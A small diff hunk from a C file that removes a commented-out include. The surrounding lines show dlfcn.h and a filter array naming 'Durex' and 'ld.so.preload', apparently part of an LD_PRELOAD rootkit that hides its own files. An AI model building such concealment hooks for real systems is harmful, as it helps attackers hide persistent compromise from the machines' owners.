@@ -3,7 +3,6 @@
 #include<dlfcn.h>
 #include<sys/types.h>
 #include<sys/stat.h>
-//#include<fcntl.h>
 #include<errno.h>
 #include<string.h>
 static const char*filter[]={"Durex","durex","ld.so.preload",0};
